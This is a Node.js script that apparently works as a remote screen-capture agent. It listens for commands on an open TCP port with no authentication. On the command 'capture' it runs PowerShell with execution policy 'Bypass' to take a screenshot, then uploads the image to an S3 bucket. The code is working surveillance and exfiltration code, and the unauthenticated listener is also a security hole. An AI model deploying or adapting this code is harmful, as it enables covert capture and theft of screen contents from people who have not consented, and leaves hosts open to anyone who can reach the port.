require('dotenv').config();
const net = require('net');
const fs = require('fs');
const path = require('path');
const { S3Client, PutObjectCommand } = require('@aws-sdk/client-s3');
const Shell = require('node-powershell');

// Configuración de AWS S3
const s3 = new S3Client({
    region: process.env.REGION,
    credentials: {
        accessKeyId: process.env.ACCESS_KEY,
        secretAccessKey: process.env.SECRET_KEY,
    },
});

// Configuración del servidor TCP
const PORT = 65432;
const server = net.createServer((socket) => {
    console.log('Listener running on 0.0.0.0:65432, waiting for commands...');

    socket.on('data', (data) => {
        const command = data.toString().trim();
        console.log(`Received command: ${command}`);
        if (command === 'capture') { // Cambié 'screenshot' a 'capture'
            console.log('Taking screenshot...');
            takeScreenshot(socket); // Pasar el socket para enviar respuesta
        }
    });

    socket.on('error', (err) => {
        console.error('Socket error:', err);
    });
});

server.listen(PORT, () => {
    console.log(`Listener is running on 0.0.0.0:${PORT}`);
});

// Función para tomar una captura de pantalla
function takeScreenshot(socket) {
    const ps = new Shell({
        executionPolicy: 'Bypass',
        noProfile: true,
    });

    const screenshotsDir = path.join(__dirname, 'screenshots');
    if (!fs.existsSync(screenshotsDir)) {
        fs.mkdirSync(screenshotsDir);
    }

    let screenshotNumber = 1;
    let screenshotPath;
    do {
        screenshotPath = path.join(screenshotsDir, `screenshot${screenshotNumber}.png`);
        screenshotNumber++;
    } while (fs.existsSync(screenshotPath));

    // Script de PowerShell para capturar la pantalla
    const script = `
    Add-Type -AssemblyName System.Windows.Forms;
    [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}');
    Start-Sleep -Milliseconds 100;
    $img = [Windows.Forms.Clipboard]::GetImage();
    $img.Save('${screenshotPath}');
    `;

    ps.addCommand(script);

    ps.invoke()
        .then(() => {
            console.log(`Screenshot saved at ${screenshotPath}`);
            uploadScreenshotToS3(screenshotPath, `screenshots/screenshot${screenshotNumber - 1}.png`, socket);
        })
        .catch(err => {
            console.error('Error capturing screenshot:', err);
            socket.write('Error capturing screenshot');
        })
        .finally(() => {
            ps.dispose();
        });
}

// Función para subir la captura de pantalla a S3
function uploadScreenshotToS3(screenshotPath, screenshotKey, socket) {
    const fileStream = fs.createReadStream(screenshotPath);
    const uploadParams = {
        Bucket: process.env.BUCKET_NAME,
        Key: screenshotKey,
        Body: fileStream,
    };

    // Subir la captura a S3 usando AWS SDK v3
    const command = new PutObjectCommand(uploadParams);

    s3.send(command)
        .then(() => {
            console.log('Screenshot uploaded successfully');
            socket.write(`Screenshot uploaded successfully to S3: ${screenshotKey}`);
        })
        .catch((err) => {
            console.error('Error uploading screenshot:', err);
            socket.write('Error uploading screenshot');
        });
}
